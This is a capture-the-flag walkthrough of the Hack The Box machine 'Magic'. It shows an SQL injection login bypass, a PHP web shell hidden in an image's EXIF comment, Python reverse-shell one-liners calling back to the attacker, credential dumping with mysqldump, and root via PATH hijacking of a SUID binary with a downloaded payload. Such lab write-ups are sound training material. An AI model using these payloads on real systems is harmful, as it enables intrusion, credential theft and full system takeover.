# Magic-HTB
Magic is a Linux machine that is rated as medium, it contains some SQL injection, upload filter, and path hijacking. So let's start :)

# Recon
I started by runing nmap scan on the machine and found 2 open ports.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -sC -sV 10.10.10.185
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-21 21:48 EDT
Nmap scan report for 10.10.10.185
Host is up (0.081s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.16 seconds
```
So we have a web server that is runing on port 80 and also ssh on port 22. By visiting the webserver we can see that there are some images and also there is a login page at the bottom

![image1](https://github.com/electronicbots/HackTheBox/blob/master/Machines/Magic/images/1.png)

Here is the login page:

![image2](https://github.com/electronicbots/HackTheBox/blob/master/Machines/Magic/images/2.png)

We can do a SQL injection in the Username field first intercept the packet with Burp:
![image3](https://github.com/electronicbots/HackTheBox/blob/master/Machines/Magic/images/3.png)

And then put this SQL injection payload in the Username field ```admin' or 1=1--+```, and send it.
![image4](https://github.com/electronicbots/HackTheBox/blob/master/Machines/Magic/images/4.png)

As you can see we got reditrected to another page ```upload.php```

![image5](https://github.com/electronicbots/HackTheBox/blob/master/Machines/Magic/images/5.png)

So we can now upload a Web Shell from it. First I downloaded an image from the Web site and used ExifTool to put in it a Web shell.
```
┌──(kali㉿kali)-[~/Desktop/HTB/Magic]
└─$ exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' shell.jpg 
    1 image files updated
```

and now we need to change from shell.jpg to shell.php.jpg so we can run our web shell :)
```
┌──(kali㉿kali)-[~/Desktop/HTB/Magic]
└─$ mv shell.jpg shell.php.jpg
```

Now upload it and you should get your Web Shell. All the images are stored here: http://10.10.10.185/images/uploads/

And we have our web shell:

![image6](https://github.com/electronicbots/HackTheBox/blob/master/Machines/Magic/images/6.png)

Now run this to get a reverse shell:

```python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR IP>",<PORT #>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' ```

You should get a reverse shell now:
```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4444            
listening on [any] 4444 ...
connect to [10.10.14.28] from (UNKNOWN) [10.10.10.185] 44704
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```

Let's upgrade our shell by using python:
```
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@ubuntu:/var/www/Magic/images/uploads$
```
# User Flag
After some searching I found a stored credintiols in ```db.php5```

```
www-data@ubuntu:/var/www/Magic$ ls
ls
assets  db.php5  images  index.php  login.php  logout.php  upload.php
www-data@ubuntu:/var/www/Magic$ cat db.php5 
cat db.php5
<?php
class Database
{
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';

    private static $cont  = null;

    public function __construct() {
        die('Init function is not allowed');
    }

    public static function connect()
    {
        // One connection through whole application
        if ( null == self::$cont )
        {
            try
            {
                self::$cont =  new PDO( "mysql:host=".self::$dbHost.";"."dbname=".self::$dbName, self::$dbUsername, self::$dbUserPassword);
            }
            catch(PDOException $e)
            {
                die($e->getMessage());
            }
        }
        return self::$cont;
    }

    public static function disconnect()
    {
        self::$cont = null;
    }
}
```
Now let's use mysqldump to get thessus password:

```
www-data@ubuntu:/var/www/Magic$ mysqldump -utheseus -piamkingtheseus -A
```

And part of the result is this: ``` INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng'); ```

We can't use ssh to login. the only way to login is by using a key-based authentication. so let's switch to it from our reverse shell.

```
www-data@ubuntu:/var/www/Magic$ su theseus
su theseus
Password: Th3s3usW4sK1ng

theseus@ubuntu:/var/www/Magic$ id
id
uid=1000(theseus) gid=1000(theseus) groups=1000(theseus),100(users)
```

We can now get User Flag:
```
theseus@ubuntu:~$ cat user.txt
cat user.txt
cf2728c3...523af67b
```

# Root Flag
I used ```LinEnum.sh``` and found that there is a SUID file called ```sysinfo```. So let's check it.

```
strings /bin/sysinfo
...
====================Hardware Info====================
lshw -short
====================Disk Info====================
fdisk -l
====================CPU Info====================
cat /proc/cpuinfo
====================MEM Usage=====================
free -h
...
```
So the binary is making calls to lshw, fdisk, cat.

```
theseus@ubuntu:/tmp$ strace -f /bin/sysinfo 2>&1 | grep exec
strace -f /bin/sysinfo 2>&1 | grep exec
execve("/bin/sysinfo", ["/bin/sysinfo"], 0x7ffc94eb4f98 /* 24 vars */) = 0
[pid  1872] execve("/bin/sh", ["sh", "-c", "lshw -short"], 0x7ffd34158b48 /* 24 vars */ <unfinished ...>
[pid  1872] <... execve resumed> )      = 0
[pid  1873] execve("/usr/bin/lshw", ["lshw", "-short"], 0x55596c191b68 /* 24 vars */) = 0
[pid  1873] read(3, "oup rw,nosuid,nodev,noexec,relat"..., 1024) = 1024
[pid  1874] execve("/bin/sh", ["sh", "-c", "fdisk -l"], 0x7ffd34158b48 /* 24 vars */ <unfinished ...>
[pid  1874] <... execve resumed> )      = 0
[pid  1875] execve("/sbin/fdisk", ["fdisk", "-l"], 0x55f096cc0b68 /* 24 vars */) = 0
[pid  1876] execve("/bin/sh", ["sh", "-c", "cat /proc/cpuinfo"], 0x7ffd34158b48 /* 24 vars */ <unfinished ...>
[pid  1876] <... execve resumed> )      = 0
[pid  1877] execve("/bin/cat", ["cat", "/proc/cpuinfo"], 0x55d3877a6b78 /* 24 vars */ <unfinished ...>
[pid  1877] <... execve resumed> )      = 0
[pid  1878] execve("/bin/sh", ["sh", "-c", "free -h"], 0x7ffd34158b48 /* 24 vars */ <unfinished ...>
[pid  1878] <... execve resumed> )      = 0
[pid  1879] execve("/usr/bin/free", ["free", "-h"], 0x55ce08d3db68 /* 24 vars */) = 0
```
The most intresting thing in theses calls is that they are not called with their absolute path. So the OS is searching the PATH to find a valid binaries to execute.

So I created a file called ```fdisk``` in my kali machine and put in it this reverse shell:

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR_IP>",<PORT #>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

And then download it into the box:
```
theseus@ubuntu:/tmp$ wget http://10.10.14.28:8000/fdisk
wget http://10.10.14.28:8000/fdisk
--2020-08-22 18:06:05--  http://10.10.14.28:8000/fdisk
Connecting to 10.10.14.28:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 229 [application/octet-stream]
Saving to: ‘fdisk’

fdisk               100%[===================>]     229  --.-KB/s    in 0s      

2020-08-22 18:06:05 (26.9 MB/s) - ‘fdisk’ saved [229/229]
```

Make sure to make it executable and that's by running ```chmod 755 fdisk```

Then run like this and you should get root.

```
theseus@ubuntu:/tmp$ PATH=.:$PATH /bin/sysinfo
```
```
┌──(kali㉿kali)-[~/Desktop/HTB/Magic]
└─$ nc -nlvp 5555         
listening on [any] 5555 ...
connect to [10.10.14.28] from (UNKNOWN) [10.10.10.185] 42916
# id
uid=0(root) gid=0(root) groups=0(root),100(users),1000(theseus)
# cat root.txt
d6a90168...2d89a7fbe2d
```
